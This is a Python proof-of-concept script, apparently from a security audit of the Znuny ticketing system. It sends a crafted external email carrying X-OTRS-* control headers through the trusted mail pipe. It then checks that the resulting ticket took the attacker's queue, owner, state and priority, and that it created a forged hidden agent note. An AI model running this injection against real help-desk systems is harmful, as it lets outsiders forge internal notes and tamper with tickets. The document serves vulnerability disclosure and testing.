#!/usr/bin/env python3
r"""
VULN-003 — Unauthenticated X-OTRS-* header injection via trusted inbound mail
=============================================================================
Vulnerable code : targets/Znuny/Kernel/System/PostMaster.pm:92 (Trusted default 1), :581 (strip only when !Trusted)
                  targets/Znuny/Kernel/System/PostMaster/NewTicket.pm:602-616 (X-OTRS-SenderType/IsVisibleForCustomer -> ArticleCreate)
                  targets/Znuny/Kernel/System/PostMaster/DestQueue.pm (X-OTRS-Queue -> queue), NewTicket owner/state/priority
Vulnerability   : CWE-807 / insecure default — attacker-controlled control headers honoured on external mail

`Trusted` defaults to 1 and the header strip only runs when NOT trusted, so `X-OTRS-*` control
headers on an externally-originated email are honoured: the sender chooses queue/owner/state/
priority/dynamic-fields and can forge an internal agent-sender article.

Proof: feed a raw email (as the trusted mail pipe does, via Maint::PostMaster::Read) carrying
X-OTRS-Queue/OwnerID/State/SenderType/IsVisibleForCustomer, and show the created ticket + article
honoured every attacker-chosen field.
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-003", "Unauth X-OTRS-* header injection via trusted inbound mail",
             ["PostMaster.pm:92 Trusted default 1; NewTicket.pm honours X-OTRS-SenderType/Queue/Owner/State"])
    sfx = C.rid()
    subj = f"attacker mail {sfx}"
    raw = (
        f"From: attacker_{sfx}@evil.example\r\n"
        "To: support@localhost\r\n"
        f"Subject: {subj}\r\n"
        f"Message-ID: <atk-{sfx}@evil.example>\r\n"
        "Date: Tue, 29 Sep 2026 12:00:00 +0000\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: text/plain; charset=UTF-8\r\n"
        "X-OTRS-Queue: Junk\r\n"                 # attacker chooses the queue
        "X-OTRS-OwnerID: 2\r\n"                  # ... the owner
        "X-OTRS-State: closed successful\r\n"    # ... the state
        "X-OTRS-Priority: 1 very low\r\n"        # ... the priority
        "X-OTRS-SenderType: agent\r\n"           # forge an AGENT-sender article
        "X-OTRS-IsVisibleForCustomer: 0\r\n"     # ... hidden from the customer (internal note)
        "\r\n"
        f"Forged internal agent note {sfx}.\r\n")
    C.log("STEP", "piping the crafted external email through Maint::PostMaster::Read (TRUSTED, as the mail pipe)")
    rc, out, err = C.postmaster_read(raw)
    C.log("INFO", f"PostMaster::Read rc={rc}")

    rows = C.db(
        "SELECT t.tn, q.name qname, t.user_id, ts.name state, st.name sender, a.is_visible_for_customer "
        "FROM ticket t JOIN queue q ON q.id=t.queue_id JOIN ticket_state ts ON ts.id=t.ticket_state_id "
        "JOIN article a ON a.ticket_id=t.id JOIN article_sender_type st ON st.id=a.article_sender_type_id "
        f"WHERE t.title='{subj}' ORDER BY t.id DESC LIMIT 1")
    C.log("PROOF", f"created ticket: {rows}")
    open(os.path.join(HERE, "request.http"), "w").write("(raw email piped to Maint::PostMaster::Read)\n\n" + raw)
    open(os.path.join(HERE, "response.txt"), "w").write(f"ticket row (tn,queue,owner,state,sender,visible): {rows}\n")

    if rows:
        tn, qname, owner, state, sender, vis = rows[0]
        ok = (qname == "Junk" and owner == "2" and state == "closed successful"
              and sender == "agent" and vis == "0")
        if ok:
            C.confirmed(f"an external email created ticket {tn} with ALL attacker-chosen control "
                        f"fields honoured: queue={qname}, owner_uid={owner}, state={state}, and a "
                        "forged AGENT-sender article hidden from the customer — X-OTRS-* headers are "
                        "trusted by default.")
        else:
            C.failed(f"not all fields honoured: queue={qname} owner={owner} state={state} sender={sender} vis={vis}")
    else:
        C.failed("no ticket created from the injected email")

if __name__ == "__main__":
    main()
